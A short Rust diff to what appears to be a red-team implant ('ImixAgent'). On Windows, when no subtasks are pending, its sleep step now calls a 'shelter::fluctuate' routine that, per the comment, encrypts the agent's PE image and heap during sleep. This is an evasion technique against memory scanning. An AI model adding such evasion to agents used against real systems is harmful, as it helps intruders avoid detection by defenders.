@@ -157,6 +157,26 @@ async fn sleep_until_next_cycle(agent: &ImixAgent, start: Instant) -> Result<()>
         interval,
         jitter
     );
-    tokio::time::sleep(delay).await;
+    #[cfg(target_os = "windows")]
+    {
+        let subtasks = agent.subtasks.lock().unwrap();
+        let has_subtasks = !subtasks.is_empty();
+        drop(subtasks);
+
+        if !has_subtasks {
+            // Using as_millis() as many sleep implementations underlying these wrappers
+            // expect milliseconds, mitigating busy-loop regressions.
+            // Since imix is running on a single-threaded Tokio runtime (current_thread flavor),
+            // blocking the current thread safely pauses the entire agent and allows `fluctuate(true)`
+            // to encrypt both PE and heap without segfaulting background async tasks.
+            let _ = shelter::fluctuate(true, Some(delay.as_millis() as u32), None);
+        } else {
+            tokio::time::sleep(delay).await;
+        }
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        tokio::time::sleep(delay).await;
+    }
     Ok(())
 }
